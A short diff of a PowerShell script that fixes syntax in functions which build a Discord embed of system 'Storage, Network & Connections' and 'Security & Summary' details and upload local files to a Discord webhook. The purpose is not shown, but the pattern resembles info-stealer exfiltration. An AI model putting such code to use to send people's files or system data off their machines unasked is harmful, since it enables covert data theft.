@@ -348,7 +348,7 @@ function Build-DiscordPayload {
             @{
                 title  = "Storage, Network & Connections"
                 color  = 3066993
-                fields = $e2.ToArray()Invoke-SafeBlock
+                fields = $e2.ToArray()
             },
             @{
                 title  = "Security & Summary"
@@ -383,7 +383,7 @@ function Send-DiscordWebhookFiles {
         foreach ($file in $FilePaths) {
             if (-not (Test-Path $file)) { continue }
             $bytes = [System.IO.File]::ReadAllBytes($file)
-            $fileContent = New-Object System.Net.Http.ByteArrayContent(, $bytes)
+            $fileContent = New-Object System.Net.Http.ByteArrayContent -ArgumentList (,$bytes)
             $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
             $multipart.Add($fileContent, ("files[{0}]" -f $index), [System.IO.Path]::GetFileName($file))
             $index++
